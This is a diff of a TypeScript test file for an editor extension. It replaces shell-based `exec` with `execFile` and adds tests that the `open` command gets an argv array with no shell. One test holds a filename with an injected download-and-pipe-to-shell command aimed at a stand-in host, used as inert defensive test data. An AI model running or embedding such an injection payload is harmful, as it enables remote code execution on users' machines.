@@ -1,7 +1,7 @@
 import { describe, it, expect, vi, beforeEach, afterEach } from "vitest";
 import * as fs from "fs";
 import * as childProcess from "child_process";
-import { attachmentFileName, briefMarkdown, openWorkspace, writeBriefInto, maybeSeedAgent, watchPlansAndSeed, listWorkspaceFiles, mergeReposIntoWorkspace, workspaceFolders, workspaceFolderPaths, planWorkspaceMerge, agentPrompt, mentionInWorkspace, containingRoot, BRIEF_DIR, BRIEF_FILE, type OpenRequest, type TicketRef, type MergeCandidate } from "../../../src/engine/workspace";
+import { attachmentFileName, briefMarkdown, openInEditor, openWorkspace, writeBriefInto, maybeSeedAgent, watchPlansAndSeed, listWorkspaceFiles, mergeReposIntoWorkspace, workspaceFolders, workspaceFolderPaths, planWorkspaceMerge, agentPrompt, mentionInWorkspace, containingRoot, BRIEF_DIR, BRIEF_FILE, type OpenRequest, type TicketRef, type MergeCandidate } from "../../../src/engine/workspace";
 import { commands, env, extensions, setConfig, window, workspace } from "../../_mocks/vscode";
 import { fakeContext, mkRepos } from "../../_helpers/factories";
 
@@ -18,7 +18,7 @@ const readdirSync = vi.mocked(fs.readdirSync);
 const rmSync = vi.mocked(fs.rmSync);
 const realpathSync = vi.mocked(fs.realpathSync);
 const watch = vi.mocked(fs.watch);
-const exec = vi.mocked(childProcess.exec);
+const execFile = vi.mocked(childProcess.execFile);
 const execSync = vi.mocked(childProcess.execSync);
 
 const CLAUDE_OPEN_CMD = "claude-vscode.primaryEditor.open";
@@ -36,7 +36,7 @@ beforeEach(() => {
   realpathSync.mockReset().mockImplementation((p) => String(p)); // identity canon
   execSync.mockReset().mockReturnValue(""); // git ls-files → no files
   // `open -a` succeeds by invoking its callback with no error.
-  exec.mockReset().mockImplementation(((_cmd: string, cb: (e: unknown) => void) => cb(null)) as never);
+  execFile.mockReset().mockImplementation(((_f: string, _a: string[], cb: (e: unknown) => void) => cb(null)) as never);
   // The config store persists across tests, so clear the surface: leaving it on
   // "terminal" would divert every one of the ~40 extension-panel seeding tests.
   setConfig({ agentSurface: undefined });
@@ -117,8 +117,28 @@ describe("openWorkspace — multiroot", () => {
     expect(plan.matches[0].prompt).toContain("@account-service-PROJ-1/src/export.py");
   });
 
+  // `open` is spawned with an argv array and NO shell. Both arguments are
+  // attacker-influenceable — the editor supplies the app name, and the target is a
+  // path built from a task key, a notepad title or a repo name — so a shell here
+  // would make `$(…)`, backticks and `;` executable through a workspace filename.
+  // Asserting the argv shape is what keeps a future `exec` refactor from re-opening it.
+  it("spawns `open` with an argv array, never a shell command string", async () => {
+    await openInEditor("/ws/PROJ-1.code-workspace");
+    expect(execFile).toHaveBeenCalledWith("open", ["-a", "Cursor", "/ws/PROJ-1.code-workspace"], expect.any(Function));
+  });
+
+  it("passes a target full of shell metacharacters through as one inert argument", async () => {
+    const nasty = "/ws/$(curl evil.sh|sh);`id`.code-workspace";
+    await openInEditor(nasty);
+    const [file, args] = execFile.mock.calls[0] as unknown as [string, string[]];
+    expect(file).toBe("open");
+    // The path arrives verbatim as its own argv slot: nothing has interpolated it into
+    // a string a shell could reparse, and nothing has mangled it trying to quote it.
+    expect(args).toEqual(["-a", "Cursor", nasty]);
+  });
+
   it("falls back to openFolder when `open -a` fails", async () => {
-    exec.mockImplementation(((_cmd: string, cb: (e: unknown) => void) => cb(new Error("no app"))) as never);
+    execFile.mockImplementation(((_f: string, _a: string[], cb: (e: unknown) => void) => cb(new Error("no app"))) as never);
     const result = await openWorkspace(baseReq());
     expect(commands.executeCommand).toHaveBeenCalledWith(
       "vscode.openFolder",
@@ -133,7 +153,7 @@ describe("openWorkspace — multiroot", () => {
   // the request that USED to take the deleted branch — a plain baseReq() never reached
   // it even before the deletion, so it would guard nothing.
   it("never asks openFolder to reuse the current window", async () => {
-    exec.mockImplementation(((_cmd: string, cb: (e: unknown) => void) => cb(new Error("no app"))) as never);
+    execFile.mockImplementation(((_f: string, _a: string[], cb: (e: unknown) => void) => cb(new Error("no app"))) as never);
     await openWorkspace(
       baseReq({
         openIn: "current",
@@ -2303,7 +2323,7 @@ describe("openWorkspace — ask", () => {
     expect(mkdirSync).not.toHaveBeenCalled();     // no brief dir, no workspace dir, no plan dir
     expect(writeFileSync).not.toHaveBeenCalled(); // no brief, no .code-workspace, no plan, no run
     expect(appendFileSync).not.toHaveBeenCalled(); // no git-exclude entry
-    expect(exec).not.toHaveBeenCalled();          // no `open -a`
+    expect(execFile).not.toHaveBeenCalled();      // no `open -a`
     expect(commands.executeCommand).not.toHaveBeenCalledWith(
       "vscode.openFolder",
       expect.anything(),
@@ -2338,7 +2358,7 @@ describe("openWorkspace — this window", () => {
     );
 
     // The whole point: no `open -a`, and no vscode.openFolder in either direction.
-    expect(exec).not.toHaveBeenCalled();
+    expect(execFile).not.toHaveBeenCalled();
     expect(commands.executeCommand).not.toHaveBeenCalledWith("vscode.openFolder", expect.anything(), expect.anything());
 
     expect(result.seededInPlace).toBe(true);
